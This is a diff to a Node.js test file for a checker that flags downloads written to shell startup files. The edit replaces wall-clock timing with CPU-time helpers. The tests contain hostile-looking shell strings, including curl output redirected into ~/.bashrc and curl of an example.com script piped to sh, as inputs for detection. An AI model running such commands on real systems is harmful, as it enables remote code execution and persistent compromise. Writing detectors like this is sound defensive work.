@@ -2,7 +2,7 @@
 
 process.env.ZN_STATS = 'off';
 
-// B-2217: a download written to a shell startup file is found whatever the spelling of the target: -o$HOME/.bashrc, a leading redirect,
+// A download written to a shell startup file is found whatever the spelling of the target: -o$HOME/.bashrc, a leading redirect,
 // dd of=, tee, and a relative file after cd, pushd or env -C.
 // Only fake example.com URLs and example paths. Nothing is run: only the text is checked.
 
@@ -10,6 +10,7 @@ const test = require('node:test');
 const assert = require('node:assert/strict');
 
 const { checkCommand } = require('../lib/destructive');
+const { cpuNow, cpuMsSince } = require('./helpers/time_budget');
 
 const DL = 'https://example.com/i.sh';
 const RC = 'https://example.com/env.sh';
@@ -69,13 +70,13 @@ test('a cd inside a pipeline does not move the folder of the next command', () =
 test('200 KB inputs with redirects and targets stay linear', () => {
   for (const u of ['>> ~/.bashrc cat x; ', `curl -o$HOME/x ${RC} | dd of=$HOME/y; `, `cd ~ && curl -o .bashrc ${RC}; `, '>a >b >c >d echo hi; ']) {
     const big = u.repeat(Math.floor((200 * 1024 - 8) / u.length));
-    const t0 = process.hrtime.bigint();
+    const t0 = cpuNow();
     rule(big);
-    const ms = Number(process.hrtime.bigint() - t0) / 1e6;
+    const ms = cpuMsSince(t0);
     assert.ok(ms < 3000, JSON.stringify(u) + ' took ' + ms + ' ms');
   }
   const redirects = '>x '.repeat(60000) + `curl ${RC} | sh`;
-  const t1 = process.hrtime.bigint();
+  const t1 = cpuNow();
   rule(redirects);
-  assert.ok(Number(process.hrtime.bigint() - t1) / 1e6 < 3000);
+  assert.ok(cpuMsSince(t1) < 3000);
 });
